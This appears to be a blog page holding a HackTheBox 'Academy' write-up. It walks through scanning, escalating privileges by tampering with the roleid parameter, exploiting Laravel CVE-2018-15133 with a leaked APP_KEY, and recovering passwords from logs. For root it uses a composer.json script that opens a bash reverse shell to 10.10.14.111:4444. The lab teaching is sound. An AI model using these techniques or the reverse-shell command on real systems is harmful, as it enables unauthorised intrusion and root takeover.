@@ -1,0 +1,154 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>HackTheBox - Academy Writeup · ElleuchX1</title><meta name="description" content="Web and cloud security, bug bounty."><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="ElleuchX1" href="/rss.xml"><meta property="og:title" content="HackTheBox - Academy Writeup · ElleuchX1"><meta property="og:description" content="Web and cloud security, bug bounty."><meta property="og:type" content="article"><meta property="og:url" content="https://elleu.ch/posts/htb-academy/"><meta property="og:image" content="https://elleu.ch/og/htb-academy.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://elleu.ch/og/htb-academy.png"><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          if (!t) t = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', t);
+        } catch (e) {}
+      })();
+      document.addEventListener('keydown', function (e) {
+        if (e.key !== '/' || e.metaKey || e.ctrlKey || e.altKey) return;
+        var t = e.target;
+        if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable)) return;
+        e.preventDefault();
+        window.location.href = '/search/';
+      });
+    </script><link rel="stylesheet" href="/_astro/_id_.mL4ELXTH.css"></head> <body> <a class="skip" href="#main">skip to content</a> <header class="site-header" data-pagefind-ignore> <div class="inner"> <a class="brand" href="/">elleuch<span class="at">:~$</span></a> <nav class="nav" aria-label="Main"> <a href="/posts/" aria-current="page">Posts</a><a href="/tags/">Tags</a><a href="/about/">About</a> <a class="search" href="/search/"><kbd>/</kbd></a> <button class="toggle" id="theme-toggle" type="button" aria-label="Toggle theme"> <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path> </svg> <svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="4"></circle> <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path> </svg> </button> <script>
+  document.getElementById('theme-toggle')?.addEventListener('click', () => {
+    const next = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    try { localStorage.setItem('theme', next); } catch (e) {}
+  });
+</script> </nav> </div> </header> <main id="main">  <div class="progress" id="progress"></div> <div class="wrap"> <article class="article" data-pagefind-body> <a class="back" href="/posts/">← Posts</a> <header class="article-head"> <h1 data-pagefind-meta="title">HackTheBox - Academy Writeup</h1> <div class="article-meta"> <time datetime="2021-04-25T00:00:00.000Z">2021-04-25</time> <span>2 min read</span> </div> <div class="article-tags"> <a href="/tags/hackthebox/">#HackTheBox</a><a href="/tags/easy/">#Easy</a> </div> </header> <details class="toc" open data-pagefind-ignore> <summary>contents</summary> <ul> <li class="d2"><a href="#nmap-scan">Nmap scan</a></li><li class="d2"><a href="#gobuster-scan">Gobuster scan</a></li><li class="d2"><a href="#identifying-the-exploit">Identifying the exploit</a></li> </ul> </details> <div class="prose">  <h1 id="information-gathering">Information Gathering</h1>
+<h2 id="nmap-scan">Nmap scan</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sudo nmap -sC -sV -T5 -oA nmap -O -A -v 10.10.10.215</span></span></code></pre>
+<p><img src="/assets/img/htb-academy/nmap.webp" alt="nmap sc"></p>
+<p>As we see we have 2 ports open <br>
+SSH on port 22 running OpenSSH 8.2p1 <br>
+http on port 80 running httpd 2.4.41 <br></p>
+<p>we notice as well the academy.htb domain, which we should add to /etc/hosts.</p>
+<h2 id="gobuster-scan">Gobuster scan</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://academy.htb -x php</span></span></code></pre>
+<p><img src="/assets/img/htb-academy/gob.webp" alt="gob sc"></p>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<h2 id="identifying-the-exploit">Identifying the exploit</h2>
+<p>So basically the first thing that tried was sql injection on <b> admin.php </b> but that didn’t give me any results. as we don’t have any potential users let’s move on and dig further. <br></p>
+<p>Let’s create an account and see if we can find any usernames and intercept it with burp</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>POST /register.php HTTP/1.1</span></span>
+<span class="line"><span>Host: academy.htb</span></span>
+<span class="line"><span>Content-Length: 53</span></span>
+<span class="line"><span>Cache-Control: max-age=0</span></span>
+<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span>
+<span class="line"><span>Origin: http://academy.htb</span></span>
+<span class="line"><span>Content-Type: application/x-www-form-urlencoded</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36</span></span>
+<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
+<span class="line"><span>Referer: http://academy.htb/register.php</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7</span></span>
+<span class="line"><span>Cookie: PHPSESSID=sdloh07q837vauvt0oqevack4o</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>uid=elleuch&#x26;password=elleuch&#x26;confirm=elleuch&#x26;roleid=0</span></span></code></pre>
+<p>We can notice the <b>roleid</b>	parameter which is set to 0. we can assume that’s assigning a role to the user we’re creating. Which basically can be a normal user ( roleid=0 ) or a privileged user ( roleid=1 ).</p>
+<p>Let’s change change 0 to 1 and forward the request and create our privileged user and try to login to <b>/admin.php</b></p>
+<p><img src="/assets/img/htb-academy/planner.webp" alt="planner sc"></p>
+<p>As we see above the planner leaks to us a subdomain <b>dev-staging-01.academy.htb</b> <br>
+Let’s add it to /etc/hosts and see what we get</p>
+<p><img src="/assets/img/htb-academy/laravel.webp" alt="laravel sc"></p>
+<p>Errors! That sounds promosing! Scrolling down we can see something really interesting</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>APP_KEY	 "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="</span></span></code></pre>
+<p>We have the APP_KEY! We can abuse <b>Laravel Unserialize Vulnerability CVE-2018-15133 </b> <br>
+For this exploit we’ll be using this script, a pretty easy syntax.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py</span></span></code></pre>
+<p><img src="/assets/img/htb-academy/foothold.webp" alt="ft sc"></p>
+<p>And voilà we’re on the box</p>
+<h1 id="user-privesc">User Privesc</h1>
+<p>Now let’s start enumarating,We already know that the webserver is running PHP Laravel. <br>
+The first thing we should look at is the <b>.env</b> file. <br></p>
+<p><img src="/assets/img/htb-academy/env.webp" alt="env sc"></p>
+<p>And we get a password! <br>
+<code>mySup3rP4s5w0rd!!</code> <br>
+Let’s see if it belongs to any existing user</p>
+<p><img src="/assets/img/htb-academy/users.webp" alt="users sc"></p>
+<p>After manually trying to switch to these users, it turns out to be cry0l1t3’s password</p>
+<p><img src="/assets/img/htb-academy/logincry.webp" alt="logincry sc"></p>
+<p>Our user is in the <b>adm</b> group! So basically we can read logs! And also we can read the audit log! We can grab some juicy informations from it</p>
+<p><img src="/assets/img/htb-academy/mrb3.webp" alt="mrb3 sc"></p>
+<p><code>data=6D7262336E5F41634064336D79210A</code></p>
+<p>Seems we got a password! But it’s hex encoded! Let’s decode it</p>
+<p><img src="/assets/img/htb-academy/pw.webp" alt="pwsc sc"></p>
+<p><code>mrb3n_Ac@d3my!</code></p>
+<p>Seems like it’s mrb3n’s password!</p>
+<h1 id="root-privesc">Root Privesc</h1>
+<p>Mrb3n can execute <b>/usr/bin/composer</b> as root!</p>
+<p><img src="/assets/img/htb-academy/sudo.webp" alt="sudo sc"></p>
+<p>Going through the docs of composer we can find out that we can execute a custom script using composer! we need to create a composer.json first in any folder we want!</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="json"><code><span class="line"><span style="color:#E1E4E8">{ </span></span>
+<span class="line"><span style="color:#79B8FF">"scripts"</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">"shell"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"/bin/bash -c 'bash -i >&#x26; /dev/tcp/10.10.14.111/4444 0>&#x26;1'"</span><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>We set our listener</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nc -lvnp 4444 </span></span></code></pre>
+<p>And execute</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sudo /usr/bin/composer --working-dir=fake run-script shell</span></span></code></pre>
+<p><img src="/assets/img/htb-academy/root.webp" alt="root sc"></p>
+<p>And we rooted the box! <br>
+<code>uid=0(root) gid=0(root) groups=0(root)</code></p>  </div> <nav class="pager" aria-label="Post navigation"> <a href="/posts/hacklock2021/"><span class="lbl">← prev</span>Securinets HackLock 2021</a> <a class="next" href="/posts/htb-atom/"><span class="lbl">next →</span>HackTheBox - Atom Writeup</a> </nav> </article> </div> <aside class="toc-rail" data-pagefind-ignore aria-label="Table of contents"> <div class="lbl">contents</div> <ul> <li class="d2"><a href="#nmap-scan">Nmap scan</a></li><li class="d2"><a href="#gobuster-scan">Gobuster scan</a></li><li class="d2"><a href="#identifying-the-exploit">Identifying the exploit</a></li> </ul> </aside><button class="to-top" id="to-top" type="button" aria-label="Back to top">↑ top</button>  </main> <footer class="site-footer" data-pagefind-ignore> <div class="inner"> <span>© 2026 ElleuchX1</span> <span> <a href="https://github.com/ElleuchX1">github</a> ·
+<a href="https://twitter.com/ElleuchX1">x</a> ·
+<a href="/rss.xml">rss</a> ·
+<a href="mailto:contact@elleu.ch">mail</a> </span> </div> </footer> </body></html> <script>
+  (function () {
+    // reading progress + back-to-top
+    var bar = document.getElementById('progress');
+    var top = document.getElementById('to-top');
+    function update() {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      var pct = max > 0 ? h.scrollTop / max : 0;
+      if (bar) bar.style.width = pct * 100 + '%';
+      if (top) top.classList.toggle('show', h.scrollTop > 600);
+    }
+    document.addEventListener('scroll', update, { passive: true });
+    if (top) top.addEventListener('click', function () { window.scrollTo({ top: 0, behavior: 'smooth' }); });
+    update();
+
+    // permalink anchors on headings
+    document.querySelectorAll('.prose h2[id], .prose h3[id]').forEach(function (h) {
+      var a = document.createElement('a');
+      a.className = 'anchor';
+      a.href = '#' + h.id;
+      a.setAttribute('aria-label', 'Link to this section');
+      a.textContent = '#';
+      h.appendChild(a);
+    });
+
+    // code blocks: language label + copy button
+    document.querySelectorAll('.prose pre.astro-code').forEach(function (pre) {
+      var wrap = document.createElement('div');
+      wrap.className = 'code';
+      pre.parentNode.insertBefore(wrap, pre);
+      var bar = document.createElement('div');
+      bar.className = 'code-bar';
+      var lang = pre.getAttribute('data-language') || 'text';
+      var span = document.createElement('span');
+      span.className = 'code-lang';
+      span.textContent = lang;
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy';
+      btn.textContent = 'copy';
+      btn.addEventListener('click', function () {
+        var text = pre.innerText;
+        var done = function () { btn.textContent = 'copied'; setTimeout(function () { btn.textContent = 'copy'; }, 1200); };
+        if (navigator.clipboard) { navigator.clipboard.writeText(text).then(done, done); }
+        else {
+          var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); } catch (e) {} ta.remove(); done();
+        }
+      });
+      bar.appendChild(span);
+      bar.appendChild(btn);
+      wrap.appendChild(bar);
+      wrap.appendChild(pre);
+    });
+  })();
+</script>
